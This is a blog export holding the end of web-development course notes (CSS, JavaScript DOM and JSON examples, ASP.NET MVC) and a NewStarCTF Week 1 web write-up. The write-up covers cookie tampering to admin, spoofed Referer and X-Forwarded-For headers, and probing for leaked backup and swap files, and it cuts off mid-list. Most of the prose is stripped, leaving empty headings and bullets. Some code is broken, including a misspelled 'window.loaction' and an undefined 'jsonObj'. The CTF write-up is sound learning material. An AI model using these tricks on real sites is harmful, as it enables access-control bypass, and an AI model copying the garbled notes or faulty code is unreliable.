class=\"line\">&lt;<span class=\"selector-tag\">div</span>&gt;&lt;/<span class=\"selector-tag\">div</span>&gt;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><code>background-color</code></li>\n<li><code>width</code></li>\n<li><code>border-left</code></li>\n<li><code>border-radius</code></li>\n<li><code>padding</code></li>\n<li><code>margin</code></li>\n<li><code>hover</code></li>\n<li><code>cursor:pointer</code></li>\n<li><code>box-shadow</code>  X Y </li>\n</ul>\n<h5 id=\"2-\"><a href=\"#2-\" class=\"headerlink\" title=\"2.\"></a>2.</h5><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">ul</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;nav&quot;</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;#home&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;#news&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;#contact&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;#about&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">ul</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">ul</span><span class=\"selector-class\">.nav</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">list-style-type</span>: none;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.nav</span> <span class=\"selector-tag\">li</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">float</span>: left;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.nav</span> <span class=\"selector-tag\">li</span> <span class=\"selector-tag\">a</span><span class=\"selector-pseudo\">:link</span>,</span><br><span class=\"line\"><span class=\"selector-class\">.nav</span> <span class=\"selector-tag\">li</span> <span class=\"selector-tag\">a</span><span class=\"selector-pseudo\">:visited</span> &#123;</span><br><span class=\"line\">        <span class=\"attribute\">display</span>: block;</span><br><span class=\"line\">        <span class=\"attribute\">width</span>: <span class=\"number\">120px</span>;</span><br><span class=\"line\">        <span class=\"attribute\">text-align</span>: center;</span><br><span class=\"line\">        <span class=\"attribute\">padding</span>: <span class=\"number\">4px</span>;</span><br><span class=\"line\">        <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">        <span class=\"attribute\">background-color</span>: <span class=\"number\">#98bf21</span>;</span><br><span class=\"line\">        <span class=\"attribute\">text-decoration</span>: none;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.nav</span> <span class=\"selector-tag\">li</span> <span class=\"selector-tag\">a</span><span class=\"selector-pseudo\">:hover</span>,</span><br><span class=\"line\"><span class=\"selector-class\">.nav</span> <span class=\"selector-tag\">li</span> <span class=\"selector-tag\">a</span><span class=\"selector-pseudo\">:active</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">background-color</span>: <span class=\"number\">#7a991a</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><code>float:left</code></li>\n<li><code>list-style-type</code></li>\n<li><code>a:link</code></li>\n<li><code>a:visited</code></li>\n<li><code>display:block</code></li>\n<li><code>text-align</code></li>\n<li><code>text-decoration</code></li>\n</ul>\n<h2 id=\"4-JavaScript\"><a href=\"#4-JavaScript\" class=\"headerlink\" title=\"4.JavaScript\"></a>4.JavaScript</h2><h4 id=\"-js\"><a href=\"#-js\" class=\"headerlink\" title=\" js\"></a> js</h4><ul>\n<li>JS**<u></u>**</li>\n<li>JS**<u></u>**</li>\n<li>JS**<u></u>**</li>\n<li>JS**<u></u>**</li>\n</ul>\n<h4 id=\"JS\"><a href=\"#JS\" class=\"headerlink\" title=\"JS\"></a>JS</h4><p><strong><code>=&gt;</code>lambda</strong></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> foo=<span class=\"keyword\">function</span>(<span class=\"params\">num</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> num+<span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">let</span> a=<span class=\"title function_\">foo</span>(<span class=\"number\">100</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> <span class=\"title function_\">foo</span> =(<span class=\"params\">num</span>)=&gt;num+<span class=\"number\">1</span>;</span><br></pre></td></tr></table></figure>\n\n<p> <strong>JS mapreducejoinslicesplicepushpopshiftunshift </strong></p>\n<p><strong>JS </strong></p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">&quot;en&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">http-equiv</span>=<span class=\"string\">&quot;X-UA-Compatible&quot;</span> <span class=\"attr\">content</span>=<span class=\"string\">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;viewport&quot;</span> <span class=\"attr\">content</span>=<span class=\"string\">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>Document<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">button</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;ok&quot;</span>&gt;</span>3<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">let</span> btn=<span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">&quot;ok&quot;</span>);</span></span><br><span class=\"line\"><span class=\"language-javascript\">    btn.<span class=\"property\">disabled</span>=<span class=\"literal\">true</span>;</span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">let</span> t=<span class=\"number\">3</span>;</span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">function</span> <span class=\"title function_\">count</span>(<span class=\"params\"></span>)&#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">        t--;</span></span><br><span class=\"line\"><span class=\"language-javascript\">        btn.<span class=\"property\">innerHTML</span>=t+<span class=\"string\">&quot;&quot;</span>;</span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"keyword\">if</span>(t&lt;=<span class=\"number\">0</span>)&#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"built_in\">clearInterval</span>(id);</span></span><br><span class=\"line\"><span class=\"language-javascript\">            btn.<span class=\"property\">disabled</span>=<span class=\"literal\">false</span>;</span></span><br><span class=\"line\"><span class=\"language-javascript\">            btn.<span class=\"property\">innerHTML</span>=<span class=\"string\">&quot;&quot;</span>;</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"keyword\">let</span> url=<span class=\"variable language_\">window</span>.<span class=\"property\">location</span>;</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"variable language_\">window</span>.<span class=\"property\">loaction</span>=<span class=\"string\">&quot;https://www.wust.edu.cn&quot;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">        &#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">    &#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">let</span> id = <span class=\"built_in\">setInterval</span>(count,<span class=\"number\">1000</span>);</span></span><br><span class=\"line\"><span class=\"language-javascript\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><code>document.getElementById</code> ID </li>\n<li><code>btn.disabled</code></li>\n<li><code>btn.innerHTML</code>  HTML</li>\n<li><code>setInterval</code></li>\n<li><code>clearInterval</code> setInterval() </li>\n<li><code>window.loaction</code></li>\n</ul>\n<h4 id=\"DOM\"><a href=\"#DOM\" class=\"headerlink\" title=\"DOM\"></a>DOM</h4><p><strong>DOM:</strong></p>\n<p><strong>DOM</strong></p>\n<h4 id=\"DOM\"><a href=\"#DOM\" class=\"headerlink\" title=\"DOM\"></a>DOM</h4><h5 id=\"1-\"><a href=\"#1-\" class=\"headerlink\" title=\"1.\"></a>1.</h5><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">ul</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;list&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">li</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;item&quot;</span>&gt;</span>1<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">li</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;item&quot;</span>&gt;</span>2<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">li</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;item&quot;</span>&gt;</span>3<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">ul</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> list = <span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">&#x27;list&#x27;</span>) <span class=\"comment\">// id=&quot;list&quot;#css</span></span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(list.<span class=\"property\">innerHTML</span>) <span class=\"comment\">//HTML</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> first = <span class=\"variable language_\">document</span>.<span class=\"title function_\">querySelector</span>(<span class=\"string\">&#x27;.item&#x27;</span>) <span class=\"comment\">//  class=&quot;item&quot; class</span></span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(first.<span class=\"property\">innerHTML</span>)</span><br><span class=\"line\"><span class=\"keyword\">let</span> second = <span class=\"variable language_\">document</span>.<span class=\"title function_\">querySelector</span>(<span class=\"string\">&#x27;.item:nth-child(2)&#x27;</span>) <span class=\"comment\">//  .item css</span></span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(second.<span class=\"property\">innerHTML</span>)</span><br><span class=\"line\"><span class=\"keyword\">let</span> items = <span class=\"variable language_\">document</span>.<span class=\"title function_\">querySelectorAll</span>(<span class=\"string\">&#x27;.item&#x27;</span>) <span class=\"comment\">//  .item NodeList</span></span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(items.<span class=\"property\">length</span>) <span class=\"comment\">//</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> ( <span class=\"keyword\">let</span> el <span class=\"keyword\">of</span> items ) &#123; <span class=\"comment\">//</span></span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(el)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"2-document-createElement\"><a href=\"#2-document-createElement\" class=\"headerlink\" title=\"2.document.createElement\"></a>2.document.createElement</h5><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">ul</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;list&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">li</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;item&quot;</span>&gt;</span>1<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">li</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;item&quot;</span>&gt;</span>2<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">li</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;item&quot;</span>&gt;</span>3<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">ul</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> list = <span class=\"variable language_\">document</span>.<span class=\"title function_\">createElement</span>(<span class=\"string\">&#x27;ul&#x27;</span>) <span class=\"comment\">//1ul</span></span><br><span class=\"line\">list.<span class=\"property\">id</span> = <span class=\"string\">&#x27;list&#x27;</span> <span class=\"comment\">// id</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> ( <span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">3</span>; i++ ) &#123;</span><br><span class=\"line\"><span class=\"keyword\">let</span> item = <span class=\"variable language_\">document</span>.<span class=\"title function_\">createElement</span>(<span class=\"string\">&#x27;li&#x27;</span>) <span class=\"comment\">//3li</span></span><br><span class=\"line\">item.<span class=\"property\">className</span> = <span class=\"string\">&#x27;item&#x27;</span> <span class=\"comment\">// class</span></span><br><span class=\"line\">item.<span class=\"property\">innerText</span> = <span class=\"string\">`<span class=\"subst\">$&#123;i + <span class=\"number\">1</span>&#125;</span>`</span> <span class=\"comment\">// innerText ()</span></span><br><span class=\"line\">list.<span class=\"title function_\">appendChild</span>(item) <span class=\"comment\">// </span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// listbody</span></span><br><span class=\"line\"><span class=\"variable language_\">document</span>.<span class=\"property\">body</span>.<span class=\"title function_\">appendChild</span>(list)</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"JSON\"><a href=\"#JSON\" class=\"headerlink\" title=\"JSON\"></a>JSON</h4><ul>\n<li><strong><u></u></strong></li>\n<li><strong><u></u></strong></li>\n<li><strong><u></u></strong></li>\n<li><strong><u></u></strong></li>\n</ul>\n<p><strong>JSONJavaScriptJSON     null</strong></p>\n<p><strong>jsonDate</strong></p>\n<h4 id=\"JSON-parse\"><a href=\"#JSON-parse\" class=\"headerlink\" title=\"JSON.parse\"></a>JSON.parse</h4><p><strong> JSON.parse(text [, reviver]) JSONJavaScript</strong></p>\n<p><strong> </strong></p>\n<ul>\n<li><code>text</code>JSON ()</li>\n<li><code>reviver</code> </li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> jstr = <span class=\"string\">&#x27;&#123;&quot;name&quot;:&quot;wust&quot;, &quot;url&quot;:&quot;www.wust.edu.cn&quot;,&quot;birthday&quot;:&quot;1898-11-21&quot;&#125;&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">let</span> obj = <span class=\"title class_\">JSON</span>.<span class=\"title function_\">parse</span>( jstr, <span class=\"keyword\">function</span>(<span class=\"params\">key, value</span>) &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (key == <span class=\"string\">&quot;birthday&quot;</span>) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">let</span> diff = <span class=\"keyword\">new</span> <span class=\"title class_\">Date</span>() - <span class=\"keyword\">new</span> <span class=\"title class_\">Date</span>(value); <span class=\"comment\">//</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">let</span> year = <span class=\"built_in\">parseInt</span>(diff / <span class=\"number\">1000</span> / <span class=\"number\">60</span> / <span class=\"number\">60</span> / <span class=\"number\">24</span> / <span class=\"number\">365</span>); <span class=\"comment\">//</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> year;</span><br><span class=\"line\">\t&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> value;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(jsonObj.<span class=\"property\">birthday</span>);</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"-MVC\"><a href=\"#-MVC\" class=\"headerlink\" title=\".MVC\"></a>.MVC</h1><h4 id=\"1-MVC\"><a href=\"#1-MVC\" class=\"headerlink\" title=\"1.MVC\"></a>1.MVC</h4><ul>\n<li>MVC:3**<u>ModelViewController</u>**</li>\n<li>MVC</li>\n<li><strong></strong> <strong></strong> <strong>UI</strong></li>\n</ul>\n<h4 id=\"2-MVC\"><a href=\"#2-MVC\" class=\"headerlink\" title=\"2.MVC\"></a>2.MVC</h4><ul>\n<li>C</li>\n<li>M</li>\n<li>V</li>\n</ul>\n<h4 id=\"3-MVC\"><a href=\"#3-MVC\" class=\"headerlink\" title=\"3.MVC\"></a>3.MVC</h4><p> ControllerView()</p>\n<p> Model</p>\n<p> Model</p>\n<p> </p>\n<p> </p>\n<p> URLURL</p>\n<p> </p>\n<h4 id=\"4-MVC\"><a href=\"#4-MVC\" class=\"headerlink\" title=\"4.MVC\"></a>4.MVC</h4><p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151451438.png\"\n                        alt=\"-1667485456621\"\n                 ></p>\n<h4 id=\"5-Razor\"><a href=\"#5-Razor\" class=\"headerlink\" title=\"5.Razor\"></a>5.Razor</h4><p><code>Razor</code>RazorC#HTML</p>\n<p><code>Razor</code></p>\n<p> C#  @{  } </p>\n<p> </p>\n<p>  @ </p>\n<p> C# </p>\n<h4 id=\"6-ViewData\"><a href=\"#6-ViewData\" class=\"headerlink\" title=\"6.ViewData\"></a>6.ViewData</h4><ul>\n<li>ViewDataControllerView</li>\n<li>ViewDataView</li>\n<li>()ViewDatanull</li>\n<li>ViewData</li>\n</ul>\n<h4 id=\"7-TrmpData\"><a href=\"#7-TrmpData\" class=\"headerlink\" title=\"7.TrmpData\"></a>7.TrmpData</h4><ul>\n<li>TempDataSession</li>\n<li>TempDataAction(Redirection)</li>\n<li>TempData</li>\n<li>TempDataViewData</li>\n</ul>\n<h4 id=\"8-\"><a href=\"#8-\" class=\"headerlink\" title=\"8.\"></a>8.</h4><p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151451623.png\"\n                        alt=\"-1667485469907\"\n                 ></p>\n<h4 id=\"9-EF-Core\"><a href=\"#9-EF-Core\" class=\"headerlink\" title=\"9.EF Core\"></a>9.EF Core</h4><p> <strong><u>Add-Migration InitialCreate</u></strong></p>\n<p> <strong><u>Uppate-Database</u></strong></p>\n<h4 id=\"10-ORM\"><a href=\"#10-ORM\" class=\"headerlink\" title=\"10.ORM\"></a>10.ORM</h4><blockquote>\n<p>ORM (Object Relation Mapping) &#x2F;</p>\n</blockquote>\n<h4 id=\"11-ORM\"><a href=\"#11-ORM\" class=\"headerlink\" title=\"11.ORM\"></a>11.ORM</h4><p> </p>\n<p> </p>\n<p> ()</p>\n<p>() </p>\n<p>  </p>\n<h4 id=\"12-DateType\"><a href=\"#12-DateType\" class=\"headerlink\" title=\"12.DateType\"></a>12.DateType</h4><table>\n<thead>\n<tr>\n<th align=\"center\">DataType</th>\n<th align=\"center\"></th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">DataType.Currency</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">DataType.Date</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">DataType.EmailAddress</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">DataType.Multiline Text</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">DataType.Password</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">DataType.Time</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">DataType.Url</td>\n<td align=\"center\">URL</td>\n</tr>\n</tbody></table>\n<h4 id=\"13-\"><a href=\"#13-\" class=\"headerlink\" title=\"13.\"></a>13.</h4><p> <code>[Required]</code> null</p>\n<p> <code>[StringLength]</code></p>\n<p> <code>[Range]</code></p>\n<p> <code>[Compare]</code></p>\n<p> <code>[RegularExpression]</code> </p>\n<p> <code>[EmailAddress]</code></p>\n<p><code>[DataType]</code></p>\n<h4 id=\"14-\"><a href=\"#14-\" class=\"headerlink\" title=\"14.\"></a>14.</h4><p> <code>[HttpPost] </code>POSTAction[HttpGet] (CreateGET)</p>\n<p> <code>[ValidateAntiForgeryToken] </code> ()</p>\n<h4 id=\"15-\"><a href=\"#15-\" class=\"headerlink\" title=\"15.\"></a>15.</h4><p> ViewData ()</p>\n<p> </p>\n<p> </p>\n<pre><code>      return View(); \n\n      @model \n\n     ModelModel\n</code></pre>\n<h4 id=\"16-\"><a href=\"#16-\" class=\"headerlink\" title=\"16.\"></a>16.</h4><p> id </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class MoviesController : Controller</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">private readonly MvcMovieContext _context;</span><br><span class=\"line\">public MoviesController(MvcMovieContext context)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">_context = context;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">// CRUD</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>"},{"title":"NewStarCTF WEEK1 WEB","date":"2022-10-07T13:54:12.000Z","excerpt":"NewStarCTF WEEK1 WEB","_content":"\n\n\n# 1.HTTP\n\n![-1665405504740](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161655204.png)\n\nget nameget\n\nget\n\n**?++=+**\n\nnamename\n\n?name=1\n\n![-1665405531405](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161655983.png)\n\npostkeykey\n\nF12htmlkey\n\n![-1665405550865](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161655026.png)\n\npostkey=ctfisgoodposturl\n\n![-1665405558353](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161655803.png)\n\nbpkey=ctfisgoodresponseadmin\n\ncookieuser=guestuser=admin\n\n\n\nflag{ed52ca0c-40c7-4c7e-bfd7-d4f2cbbd2435}\n\n# 2.Head?Header!\n\n![-1665405589688](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161656086.png)\n\nCTFbp\n\n![-1665405599681](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161656618.png)\n\nctf.com'referer\n\n> Referer    HTTP  header web   Referer  www.google.com www.baidu.com www.baidu.com header \n>\n> ```\n> Referer=http://www.google.com\n> ```\n>\n>  Referer  \n\n[referer](https://blog.csdn.net/shenqueying/article/details/79426884)\n\n\n\n**referer:ctf.com**\n\n![-1665405614966](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161656077.png)\n\nlocalphpX-Forward-For\n\n[X-Forwarded-For](https://www.jianshu.com/p/15f3498a7fad)\n\n\n\n**X-Fordward-For:127.0.0.1**\n\n127.0.0.1\n\n![-1665405624087](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161656892.png)\n\nflag{d0637815-c4fc-4aa4-a842-06ebfc22817b}\n\n# 3.\n\n![-1665405631706](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161657077.png)\n\nflag\n\n\n\nrobots.txt .index.php.swp www.zip index.php~ \n\nrobots.txt .index.php.swp 